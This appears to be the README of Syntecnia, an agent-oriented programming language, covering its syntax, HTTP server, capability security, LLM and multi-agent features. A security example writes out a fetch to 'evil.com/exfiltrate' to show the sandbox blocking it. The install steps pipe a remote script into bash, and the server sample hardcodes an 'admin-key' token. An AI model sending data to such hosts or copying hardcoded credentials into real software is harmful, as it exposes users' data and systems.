# Syntecnia

A programming language designed for AI agents.

Syntecnia is not a framework or a library — it's a language where observability, security, multi-agent coordination, human interaction, and LLM integration are built-in primitives, not afterthoughts.

## Install

Zero dependencies — only needs Python 3.10+.

```bash
git clone https://github.com/kitecosmic/Syntecnia.git
cd Syntecnia
```

Then choose one:

```bash
# Option 1: pip (creates the 'syntecnia' command)
pip install -e .

# Option 2: uv (faster, modern)
uv pip install -e .

# Option 3: no install needed (run directly)
python3 -m syntecnia version
```

All three work. Option 3 doesn't require any package manager — if you have Python, you can run Syntecnia.

## Quick start

Create `hello.syn`:

```
let name be "World"
print("Hello, " + name + "!")

task greet(person)
    give "Welcome, " + person

print(greet("Alice"))
```

Run it:

```bash
syntecnia run hello.syn
```

## Usage

```bash
syntecnia run program.syn              # Run a program
syntecnia run program.syn -v           # Run with verbose output
syntecnia run program.syn --secure     # Run in secure mode (all capabilities must be granted)
syntecnia run program.syn --provider anthropic  # Use Claude as LLM engine
syntecnia run program.syn --grant net:api.example.com  # Grant a capability
syntecnia run program.syn --audit      # Show capability audit trail
syntecnia run program.fsyn             # Run flat (document-style) syntax
syntecnia repl                         # Interactive mode
syntecnia check program.syn            # Parse and validate without running
syntecnia tokens program.syn           # Show token stream
syntecnia ast program.syn              # Show abstract syntax tree
syntecnia testgen program.syn          # Auto-generate and run tests
```

## Language overview

### Variables and types

```
let name be "Alice"
let age be 30
let active be true
let items be [1, 2, 3]
let config be {"host": "localhost", "port": 8080}
```

### Tasks (functions)

```
task add(a, b)
    give a + b

task factorial(n)
    when n <= 1
        give 1
    otherwise
        give n * factorial(n - 1)
```

### Flow control

```
when score >= 90
    print("Excellent")
otherwise when score >= 70
    print("Good")
otherwise
    print("Keep trying")

each item in items
    print(item)

match status
    is "pending"
        process()
    is "done"
        archive()
```

### Custom types

```
type Customer
    name: text
    email: text
    balance: number

let c be Customer("Alice", "alice@example.com", 500)
print(name of c)
```

### Pipe operator

```
let result be data |> clean |> validate |> transform
```

### Intentional operations

Instead of loops, express what you want:

```
let expensive be where(products, is_expensive)
let names be collect(users, "name")
let doubled be apply(double, numbers)
let total be reduce(prices, add, 0)
let sorted be sort_by(products, get_price)
let groups be group_by(orders, get_status)
```

### HTTP server

A native, zero-dependency HTTP server (built on `http.server`). The runtime
enforces a consistent response contract, pagination, auth and input validation.

```
require serve(8080)

task check_token(token)
    when token == "admin-key"
        give {"role": "admin"}
    give nothing

serve on 8080
    auth with check_token

    route "GET /products"
        give sql("SELECT id, name, price FROM products")     -- list → paginated envelope

    route "GET /products/:id"
        let rows be sql("SELECT * FROM products WHERE id = ?", [params.id])
        when length(rows) == 0
            give not_found("product not found")              -- 404
        give rows[0]                                          -- map → object as-is

    route "POST /products" requires auth
        expect body {name: text, price: number}              -- 400 if invalid
        let b be json of request
        sql_exec("INSERT INTO products (name, price) VALUES (?, ?)", [name of b, price of b])
        give created(b)                                       -- 201
```

- **Capability:** `require serve(PORT)` — scoped to the port. Without it, `serve on PORT` fails with a clear error.
- **Request:** `request.json`, `request.body`, `request.headers`, `request.user`, plus `query` and `params` maps.
- **Response contract:** `give <map>` → the object as-is; `give <list>` → `{"items", "count", "total", "cursor"}`. Helpers: `ok(x)`, `created(x)` (201), `not_found(x)` (404), `fail(code, msg)`.
- **Pagination:** always applied to collections — default `limit` 100, `?limit=` / `?cursor=`, `total` always present.
- **Auth:** `requires auth` extracts the `Authorization: Bearer` token, calls the `auth with` task; `nothing` → 401, otherwise the value lands in `request.user`.
- **Validation:** `expect body {field: type}` (`text`, `number`, `bool`, `list`, `map`) → 400 naming the bad field.
- **Isolation:** each request runs in its own interpreter/scope, like an agent; only the blackboard and DB are shared. Uncaught errors become 500 — never a server crash.

See [.syntecnia-skill/serve.md](.syntecnia-skill/serve.md) for full details.

## Security

### Capabilities

Zero access by default. Declare what you need:

```
require net("api.example.com")
require file("/data/*")

let data be fetch("https://api.example.com/data")
let content be read_file("/data/report.csv")
```

### Intent

Declare what your program is for. The intent is a human-readable description, used for auditing and as context for the LLM. It can be written in any language:

```
intent: "Read customer data from api.shop.com and generate reports"
```

The intent is **descriptive** — it does not authorize actions. Security is enforced by capabilities, which are explicit and predictable:

```
require net("api.shop.com")

fetch("https://api.shop.com/customers")   -- works: capability granted
fetch("https://evil.com/exfiltrate")      -- BLOCKED: no capability for evil.com
```

There is exactly one authorization model — capabilities — so behavior never depends on guessing the meaning of prose. The intent is frozen after declaration: a prompt injection cannot redeclare a broader intent.

### Per-task capabilities

Tasks run in their own sandbox:

```
task fetch_orders()
    require net("api.shop.com")
    give fetch("https://api.shop.com/orders")

-- fetch_orders can ONLY access api.shop.com
-- even if the program has broader net capabilities
```

## LLM integration

The LLM is the reasoning engine, swappable like a database driver:

```
let analysis be analyze sales_data for "trends"
let action be decide between ["refund", "replace"] given complaint
let response be generate "email" given ticket with tone = "empathetic"
```

Configure the provider:

```bash
syntecnia run program.syn --provider anthropic   # Claude
syntecnia run program.syn --provider openai       # GPT
syntecnia run program.syn --provider ollama       # Local model
```

## Human interaction

Approval gates, questions, and confirmations are language primitives:

```
approve "Deploy to production?"
let choice be ask "Which environment?" with ["staging", "prod"]
confirm "Send email to 500 customers?"
show preview as "Email Preview"
```

## Multi-agent coordination

```
agent Researcher
    require net("*.wikipedia.org")
    task search(query)
        let data be fetch(query)
        share data as "research"

agent Writer
    observe "research" as data
    let report be generate "report" given data

spawn Researcher with query = "AI safety"
```

Agents coordinate via:
- **Blackboard**: shared state with versioning and watchers
- **Signals**: inter-agent messaging
- **Resource locks**: preventive conflict detection (not after-the-fact)

## Observability

```
trace "payment_processing"
    log "Processing order " + order_id
    measure "db_query"
        let result be query(sql)
    checkpoint "after_query"
```

### Rich error diagnostics

When something fails, you get:

```
ERROR: orders.syn:12:16: Division by zero

  Location: orders.syn:12:16
  Intent: Calculate order totals

  Source:
     >>   12 |     give total / units

  Variables at failure:
    order = {customer: Alice, quantity: 0, price: 100}

  Suggestions:
    1. Add a guard: when quantity != 0
    2. Add invariant: quantity > 0

  Category: data
  Recoverable: yes
```

### Automatic recovery

The runtime tries to recover before failing:
1. Retry with backoff (for IO errors)
2. Fallback to cached/default data
3. Partial results
4. Speculative alternatives
5. Human escalation with options and impact analysis

## Agent memory and rules

### Progress tracking

```
create_progress("sync", ["fetch", "validate", "update"])
start_step("sync", "fetch")
complete_step("sync", "fetch", "100 items")
-- If the agent crashes, resume_point("sync") returns where to continue
```

### Persistent memory

```
remember("preference", "Customer prefers formal tone", ["communication"])
remember("learning", "API is slow on Mondays", ["api"])
let prefs be recall("preference", ["communication"])
```

### Owner rules

```
add_rule("max_discount", "must", "discount <= 0.20", "pricing")
add_rule("formal_tone", "prefer", "Use formal tone", "communication")
let violations be check_rules("pricing", {"discount": 0.25})
```

Rule levels: `must` (hard block), `should` (warning), `avoid` (preference against), `prefer` (preference for).

## Flat syntax

For document-style readability, use `.fsyn` files:

```
task process_order(order):
    When amount of order > 1000, approve "Large order".
    Otherwise, log "Standard order".
    Then give "processed".
end
```

## Auto-generated tests

```bash
syntecnia testgen program.syn
```

Automatically generates edge-case tests from your types and task signatures:
- Zero, negative, empty string, empty list, nothing
- Type constructor arity checks
- Invariant verification
- Idempotency tests

## Tests

```bash
python3 tests/test_core.py          # 32 tests
python3 tests/test_capabilities.py  # 14 tests
python3 tests/test_agents.py        # 17 tests
python3 tests/test_intent.py        # 15 tests
python3 tests/test_advanced.py      # 40 tests
python3 tests/test_recovery.py      # 24 tests
python3 tests/test_agent_systems.py # 25 tests
```

167 tests total, 0 failures.

## Architecture

```
syntecnia/
├── core/              # Language foundation
│   ├── tokens.py      # Token definitions (60+ types)
│   ├── lexer.py       # Tokenizer with significant whitespace
│   ├── ast_nodes.py   # AST node definitions (40+ types)
│   ├── parser.py      # Recursive descent + Pratt parser
│   ├── interpreter.py # Tree-walking evaluator
│   ├── types.py       # Type system with origin tracking
│   ├── ast_api.py     # Structural AST manipulation
│   ├── testgen.py     # Automatic test generation
│   ├── intentional_ops.py  # apply/where/transform/reduce
│   ├── addressable.py # Token-efficient code access
│   └── flat_syntax.py # Document-style syntax translator
├── capabilities/      # Security layer
│   ├── model.py       # Capability types and sets
│   ├── enforcer.py    # Runtime enforcement
│   ├── builtins.py    # Secure I/O operations
│   └── intent.py      # Intent parsing and enforcement
├── runtime/           # Execution engine
│   ├── engine.py      # Top-level orchestrator
│   ├── speculative.py # Fork/rollback/commit execution
│   ├── error_reporter.py  # Rich error diagnostics
│   └── recovery.py    # Auto-recovery and escalation
├── agents/            # Multi-agent system
│   ├── blackboard.py  # Thread-safe shared state
│   ├── swarm.py       # Agent lifecycle and coordination
│   ├── resource_lock.py   # Preventive conflict detection
│   ├── progress.py    # Task progress tracking
│   ├── memory.py      # Persistent memory and rules
│   └── builtins.py    # Agent operation builtins
├── human/             # Human interaction
│   └── interaction.py # Terminal, auto, queue, callback handlers
├── llm/               # LLM integration
│   ├── provider.py    # Anthropic, OpenAI, MiniMax, Ollama, Mock
│   ├── context.py     # Context builder for enriched prompts
│   └── validator.py   # Response validation + retry with feedback
└── cli.py             # Command-line interface
```

## AI Skill (for Claude Code, Codex, etc.)

Syntecnia includes a structured skill so AI coding assistants can learn the language. The skill is organized as an indexed folder — the AI reads only the sections it needs.

### Install the skill (Claude Code)

```bash
# From the repo
cd Syntecnia && bash install-skill.sh

# Or remote
curl -s https://raw.githubusercontent.com/kitecosmic/Syntecnia/main/install-skill.sh | bash
```

Then add to your `CLAUDE.md`:
```
For Syntecnia development, read ~/.claude/skills/syntecnia/INDEX.md
```

### Skill index

The skill lives in `.syntecnia-skill/` and is organized by topic:

| File | When to read |
|------|-------------|
| [INDEX.md](.syntecnia-skill/INDEX.md) | **Always read first** — points to everything else |
| [syntax.md](.syntecnia-skill/syntax.md) | Writing or reading `.syn` code — keywords, operators, statement patterns |
| [builtins.md](.syntecnia-skill/builtins.md) | Need to know what functions exist — all built-in tasks with signatures |
| [types.md](.syntecnia-skill/types.md) | Working with data — type system, property access, truthiness |
| [capabilities.md](.syntecnia-skill/capabilities.md) | Adding security — require, sandbox, intent, per-task scoping |
| [agents.md](.syntecnia-skill/agents.md) | Multi-agent work — blackboard, swarm, signals, resource locks |
| [llm.md](.syntecnia-skill/llm.md) | Using AI reasoning — reason, decide, analyze, generate, providers |
| [human.md](.syntecnia-skill/human.md) | Human interaction — approve, confirm, ask, escalation |
| [observability.md](.syntecnia-skill/observability.md) | Debugging — trace, log, measure, error diagnostics, recovery |
| [memory.md](.syntecnia-skill/memory.md) | Agent persistence — progress tracking, memory, owner rules |
| [patterns.md](.syntecnia-skill/patterns.md) | Common idioms — safe division, pipe chains, intentional ops |
| [structure.md](.syntecnia-skill/structure.md) | Understanding the codebase — file map with entry points |

### For other AI tools (Codex, Cursor, Windsurf, etc.)

Point the tool at `.syntecnia-skill/INDEX.md` in the repo root. Each tool has its own way to add context:

- **Codex**: reference the skill folder in your system instructions
- **Cursor**: add `.syntecnia-skill/` to your project rules or docs
- **Windsurf**: include INDEX.md in your cascade context
- **Any tool**: paste the contents of INDEX.md as system prompt, the AI will know which sub-file to request

### LLM response validation

When Syntecnia connects to an LLM, responses are validated automatically:

- `decide` responses **must** be exactly one of the given options
- Invalid responses trigger a retry (up to 3 attempts)
- Each retry includes feedback: *"Your response was invalid because X"*
- The LLM receives full program context: intent, variables, rules, memory, progress

## Roadmap

- [ ] Port runtime to Rust (tokio async, real parallelism)
- [ ] Async I/O operations
- [ ] Database capability and query builder
- [x] Web server capability (`serve on PORT`)
- [ ] Package manager for verified capabilities
- [ ] Language server protocol (LSP) for IDE support
- [ ] Visual dashboard for agent swarm monitoring

## License

MIT
